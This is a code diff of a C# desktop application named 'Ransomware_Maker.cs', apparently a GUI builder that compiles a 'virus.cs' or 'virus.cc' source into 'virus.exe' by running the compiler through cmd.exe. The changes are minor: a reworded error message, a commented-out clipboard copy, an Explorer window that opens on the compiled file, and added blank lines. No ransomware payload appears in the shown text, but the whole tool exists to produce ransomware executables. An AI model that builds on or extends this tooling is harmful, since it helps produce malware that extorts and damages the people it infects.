@@ -6,8 +6,7 @@ using System.IO;
 using System.Linq;
 using System.Windows;
 using System.Windows.Input;
-
-
+#pragma warning disable CS8509 
 namespace Ransomware_Maker.cs
 {
     /// <summary>
@@ -15,12 +14,13 @@ namespace Ransomware_Maker.cs
     /// </summary>
     public partial class MainWindow : Window
     {
+        public bool isPrompted;
         public MainWindow()
         {
             InitializeComponent();
             if (!(File.Exists("virus.cc") || File.Exists("virus.cs")))
             {
-                MessageBox.Show("source code not found.",Title,MessageBoxButton.OK,MessageBoxImage.Error);
+                MessageBox.Show("source code file not found.",Title,MessageBoxButton.OK,MessageBoxImage.Error);
                 Application.Current.Shutdown(1);
             }
         }
@@ -105,24 +105,32 @@ namespace Ransomware_Maker.cs
                 return;
             }
             bool smallest = chk_resize.IsChecked == true;
+
             string outputOption = lang switch
             {
                 "c#" => " /out:virus.exe ",
                 "c++" => " -o virus ",
             };
             string cmd = $"{lbl_compiler.Content} {outputOption} {path} {AddArgv(lang,smallest)} ";
-            Clipboard.SetText(cmd);
+            // Clipboard.SetText(cmd);
             string result = ExecCmd(cmd);
             if (string.Empty == result)
             {
                 MessageBox.Show("Compiled successfully", Title, MessageBoxButton.OK, MessageBoxImage.Information);
+                if (!isPrompted)
+                {
+                    Process.Start("explorer.exe", $"/select,virus.exe");
+                    isPrompted = true;
+                }
             }
             else
+
             {
                 MessageBox.Show(result, Title, MessageBoxButton.OK, MessageBoxImage.Error);
             }
         }
         string AddArgv(string langType, bool smallest)
+
         {
             string result = langType switch
             {
@@ -147,12 +155,14 @@ namespace Ransomware_Maker.cs
                 };
             }
 
+
             return result;
         }
 
         static string ExecCmd(string cmd)
             {
                 ProcessStartInfo psi = new()
+
                 {
                     FileName = "cmd.exe",
                     RedirectStandardOutput = true,
@@ -228,7 +238,6 @@ namespace Ransomware_Maker.cs
             string tempPath = Path.GetTempPath();
 
             string filePath = Path.Combine(tempPath, $"{randomStr}.{suffix}");
-
             using (StreamWriter writer = new(filePath))
             {
                 writer.Write(data);
